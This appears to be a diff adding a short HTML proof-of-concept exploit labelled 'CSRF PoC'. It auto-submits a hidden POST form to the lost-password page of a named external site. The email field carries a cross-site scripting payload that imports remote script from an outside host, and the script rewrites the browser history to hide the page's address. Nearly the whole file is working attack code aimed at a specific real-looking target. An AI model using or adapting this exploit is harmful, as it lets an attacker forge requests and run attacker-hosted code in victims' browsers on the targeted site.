@@ -1,0 +1,16 @@
+<html>
+  <!-- CSRF PoC - nb1b3k -->
+  <body>
+    <form id="myForm" action="https://annotator.bii.a-star.edu.sg/annie/LostPasswd.do" method="POST">
+      <input type="hidden" name="email" value='asd<marquee%20onstart=import("//x55.is")>asd</marquee>' />
+      <input type="hidden" name="passwd" value="hello" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      setTimeout(function() {
+        document.getElementById('myForm').submit();
+      }, 1000);  // Adjust the delay (in milliseconds) as needed
+    </script>
+  </body>
+</html>
